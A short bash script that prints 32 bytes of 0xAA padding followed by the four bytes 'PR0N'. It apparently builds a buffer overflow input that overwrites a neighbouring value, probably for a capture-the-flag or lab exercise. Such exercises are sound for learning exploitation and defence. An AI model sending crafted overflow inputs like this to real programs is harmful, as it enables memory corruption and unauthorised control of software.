#!/usr/bin/env bash

function repeat {
    for i in `seq $1`; do
        echo -n -e "$2"
    done
}

repeat 32 "\xAA"
repeat 1 "\x50\x52\x30\x4e"
